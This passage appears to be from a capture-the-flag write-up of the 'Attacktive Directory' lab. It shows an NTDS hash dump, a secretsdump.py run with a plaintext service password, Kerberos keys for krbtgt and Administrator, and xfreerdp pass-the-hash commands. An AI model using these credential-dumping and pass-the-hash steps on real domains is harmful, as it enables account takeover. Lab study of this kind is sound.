SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
SMB         10.10.28.119   445    ATTACKTIVEDIREC  Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
SMB         10.10.28.119   445    ATTACKTIVEDIREC  Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
SMB         10.10.28.119   445    ATTACKTIVEDIREC  Administrator:des-cbc-md5:2079ce0e5df189ad
SMB         10.10.28.119   445    ATTACKTIVEDIREC  ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:9f0654d0c1bf2848a6479d49ec676e28fadb5de619bdeeb7c3862cfbf9fad8a0
SMB         10.10.28.119   445    ATTACKTIVEDIREC  ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:fa747d1de3b37d54d18dd13370ad252c
SMB         10.10.28.119   445    ATTACKTIVEDIREC  ATTACKTIVEDIREC$:des-cbc-md5:1625a7264c8a32b6
SMB         10.10.28.119   445    ATTACKTIVEDIREC  krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
SMB         10.10.28.119   445    ATTACKTIVEDIREC  krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
SMB         10.10.28.119   445    ATTACKTIVEDIREC  krbtgt:des-cbc-md5:b94f97e97fabbf5d
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\paradox:des-cbc-md5:83988983f8b34019
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
SMB         10.10.28.119   445    ATTACKTIVEDIREC  spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
SMB         10.10.28.119   445    ATTACKTIVEDIREC  [+] Dumped 69 NTDS hashes to /home/noroot/.cme/logs/ATTACKTIVEDIREC_10.10.191.145_2021-08-10_012906.ntds of which 17 were added to the database
```

### secretsdump

```
❯ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py spookysec.local/backup:backup2517860@10.10.28.119
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:88dbcf1ea5935c4939535b559a31c6bb:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:9f0654d0c1bf2848a6479d49ec676e28fadb5de619bdeeb7c3862cfbf9fad8a0
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:fa747d1de3b37d54d18dd13370ad252c
ATTACKTIVEDIREC$:des-cbc-md5:1625a7264c8a32b6
[*] Cleaning up...
```

-----

## Connection via rdp
Trying to connect via remote desktop. I was able to find that the machine has specified certain policies for which it is not possible.

> ❯ xfreerdp /u:Administrator /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145
> ❯ xfreerdp /u:a-spooks /pth:0e0363213e37b94221497260b0bcb4fc /v:10.10.191.145

![desktop](/assets/imgs/attacktive-directory/desktop.png)
